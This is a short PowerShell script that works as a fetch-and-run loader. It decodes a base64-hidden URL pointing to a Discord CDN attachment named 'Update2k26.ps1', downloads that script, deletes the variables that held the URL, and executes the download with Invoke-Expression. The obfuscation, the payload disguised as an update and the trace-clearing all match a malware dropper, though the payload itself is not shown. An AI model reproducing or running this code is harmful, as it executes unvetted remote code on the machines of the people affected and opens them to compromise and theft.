[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$b64 = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTUyNjI0NDg5NTYzODE1OTQ0MS8xNTI2MjQ1MzcwMDA1NDIyMTYwL1VwZGF0ZTJrMjYucHMxP2V4PTZhNTY1MjQ0JmlzPTZhNTUwMGM0JmhtPWZhYWQ1OWE2YzVmOWYxMzZlZDA4NWUxMmEyM2I4ZTY3MjA5NjA3ODBiYjgwY2FiMjFlOGM3YjJjNTJmMzI2MmMm"
$CoreLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
$code = Invoke-RestMethod -Uri $CoreLink -UseBasicParsing
Remove-Variable b64, CoreLink -ErrorAction SilentlyContinue
Invoke-Expression $code
